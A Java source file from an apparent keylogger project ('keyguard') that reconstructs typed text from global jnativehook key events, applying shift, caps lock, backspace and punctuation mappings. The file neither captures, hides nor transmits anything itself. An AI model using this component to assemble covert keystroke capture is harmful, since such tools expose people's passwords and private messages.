package com.keyguard.javakeyguard.keylogger.reconstruction;

import com.github.kwhat.jnativehook.NativeInputEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;

import java.util.HashMap;
import java.util.Map;

public class ReconstructionService {

    private final StringBuilder buffer = new StringBuilder();
    private boolean capsLockOn = false;

    private static final Map<Integer, Character> LETTER_MAP = new HashMap<>();
    private static final Map<Integer, Character> DIGIT_MAP = new HashMap<>();
    private static final Map<Integer, Character> SHIFT_DIGIT_MAP = new HashMap<>();
    private static final Map<Integer, Character> PUNCTUATION_MAP = new HashMap<>();
    private static final Map<Integer, Character> SHIFT_PUNCTUATION_MAP = new HashMap<>();

    static {
        LETTER_MAP.put(NativeKeyEvent.VC_A, 'a');
        LETTER_MAP.put(NativeKeyEvent.VC_B, 'b');
        LETTER_MAP.put(NativeKeyEvent.VC_C, 'c');
        LETTER_MAP.put(NativeKeyEvent.VC_D, 'd');
        LETTER_MAP.put(NativeKeyEvent.VC_E, 'e');
        LETTER_MAP.put(NativeKeyEvent.VC_F, 'f');
        LETTER_MAP.put(NativeKeyEvent.VC_G, 'g');
        LETTER_MAP.put(NativeKeyEvent.VC_H, 'h');
        LETTER_MAP.put(NativeKeyEvent.VC_I, 'i');
        LETTER_MAP.put(NativeKeyEvent.VC_J, 'j');
        LETTER_MAP.put(NativeKeyEvent.VC_K, 'k');
        LETTER_MAP.put(NativeKeyEvent.VC_L, 'l');
        LETTER_MAP.put(NativeKeyEvent.VC_M, 'm');
        LETTER_MAP.put(NativeKeyEvent.VC_N, 'n');
        LETTER_MAP.put(NativeKeyEvent.VC_O, 'o');
        LETTER_MAP.put(NativeKeyEvent.VC_P, 'p');
        LETTER_MAP.put(NativeKeyEvent.VC_Q, 'q');
        LETTER_MAP.put(NativeKeyEvent.VC_R, 'r');
        LETTER_MAP.put(NativeKeyEvent.VC_S, 's');
        LETTER_MAP.put(NativeKeyEvent.VC_T, 't');
        LETTER_MAP.put(NativeKeyEvent.VC_U, 'u');
        LETTER_MAP.put(NativeKeyEvent.VC_V, 'v');
        LETTER_MAP.put(NativeKeyEvent.VC_W, 'w');
        LETTER_MAP.put(NativeKeyEvent.VC_X, 'x');
        LETTER_MAP.put(NativeKeyEvent.VC_Y, 'y');
        LETTER_MAP.put(NativeKeyEvent.VC_Z, 'z');

        DIGIT_MAP.put(NativeKeyEvent.VC_0, '0');
        DIGIT_MAP.put(NativeKeyEvent.VC_1, '1');
        DIGIT_MAP.put(NativeKeyEvent.VC_2, '2');
        DIGIT_MAP.put(NativeKeyEvent.VC_3, '3');
        DIGIT_MAP.put(NativeKeyEvent.VC_4, '4');
        DIGIT_MAP.put(NativeKeyEvent.VC_5, '5');
        DIGIT_MAP.put(NativeKeyEvent.VC_6, '6');
        DIGIT_MAP.put(NativeKeyEvent.VC_7, '7');
        DIGIT_MAP.put(NativeKeyEvent.VC_8, '8');
        DIGIT_MAP.put(NativeKeyEvent.VC_9, '9');

        SHIFT_DIGIT_MAP.put(NativeKeyEvent.VC_1, '!');
        SHIFT_DIGIT_MAP.put(NativeKeyEvent.VC_2, '@');
        SHIFT_DIGIT_MAP.put(NativeKeyEvent.VC_3, '#');
        SHIFT_DIGIT_MAP.put(NativeKeyEvent.VC_4, '$');
        SHIFT_DIGIT_MAP.put(NativeKeyEvent.VC_5, '%');
        SHIFT_DIGIT_MAP.put(NativeKeyEvent.VC_6, '^');
        SHIFT_DIGIT_MAP.put(NativeKeyEvent.VC_7, '&');
        SHIFT_DIGIT_MAP.put(NativeKeyEvent.VC_8, '*');
        SHIFT_DIGIT_MAP.put(NativeKeyEvent.VC_9, '(');
        SHIFT_DIGIT_MAP.put(NativeKeyEvent.VC_0, ')');

        PUNCTUATION_MAP.put(NativeKeyEvent.VC_MINUS, '-');
        PUNCTUATION_MAP.put(NativeKeyEvent.VC_EQUALS, '=');
        PUNCTUATION_MAP.put(NativeKeyEvent.VC_OPEN_BRACKET, '[');
        PUNCTUATION_MAP.put(NativeKeyEvent.VC_CLOSE_BRACKET, ']');
        PUNCTUATION_MAP.put(NativeKeyEvent.VC_BACK_SLASH, '\\');
        PUNCTUATION_MAP.put(NativeKeyEvent.VC_SEMICOLON, ';');
        PUNCTUATION_MAP.put(NativeKeyEvent.VC_QUOTE, '\'');
        PUNCTUATION_MAP.put(NativeKeyEvent.VC_COMMA, ',');
        PUNCTUATION_MAP.put(NativeKeyEvent.VC_PERIOD, '.');
        PUNCTUATION_MAP.put(NativeKeyEvent.VC_SLASH, '/');
        PUNCTUATION_MAP.put(NativeKeyEvent.VC_BACKQUOTE, '`');

        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_MINUS, '_');
        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_EQUALS, '+');
        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_OPEN_BRACKET, '{');
        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_CLOSE_BRACKET, '}');
        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_BACK_SLASH, '|');
        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_SEMICOLON, ':');
        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_QUOTE, '"');
        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_COMMA, '<');
        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_PERIOD, '>');
        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_SLASH, '?');
        SHIFT_PUNCTUATION_MAP.put(NativeKeyEvent.VC_BACKQUOTE, '~');
    }

    public String handleKeyPressed(NativeKeyEvent e) {
        int keyCode = e.getKeyCode();
        boolean shiftDown = (e.getModifiers() & NativeInputEvent.SHIFT_MASK) != 0;

        if (keyCode == NativeKeyEvent.VC_CAPS_LOCK) {
            capsLockOn = !capsLockOn;
            return buffer.toString();
        }

        if (keyCode == NativeKeyEvent.VC_BACKSPACE) {
            if (!buffer.isEmpty()) {
                buffer.deleteCharAt(buffer.length() - 1);
            }
            return buffer.toString();
        }

        if (keyCode == NativeKeyEvent.VC_SPACE) {
            buffer.append(' ');
            return buffer.toString();
        }

        if (LETTER_MAP.containsKey(keyCode)) {
            char baseChar = LETTER_MAP.get(keyCode);
            boolean uppercase = shiftDown ^ capsLockOn;
            buffer.append(uppercase ? Character.toUpperCase(baseChar) : baseChar);
            return buffer.toString();
        }

        if (DIGIT_MAP.containsKey(keyCode)) {
            char ch = shiftDown && SHIFT_DIGIT_MAP.containsKey(keyCode)
                    ? SHIFT_DIGIT_MAP.get(keyCode)
                    : DIGIT_MAP.get(keyCode);
            buffer.append(ch);
            return buffer.toString();
        }

        if (PUNCTUATION_MAP.containsKey(keyCode)) {
            char ch = shiftDown && SHIFT_PUNCTUATION_MAP.containsKey(keyCode)
                    ? SHIFT_PUNCTUATION_MAP.get(keyCode)
                    : PUNCTUATION_MAP.get(keyCode);
            buffer.append(ch);
            return buffer.toString();
        }

        return buffer.toString();
    }

    public void handleKeyReleased(NativeKeyEvent e) {
    }

    public String getCurrentText() {
        return buffer.toString();
    }
}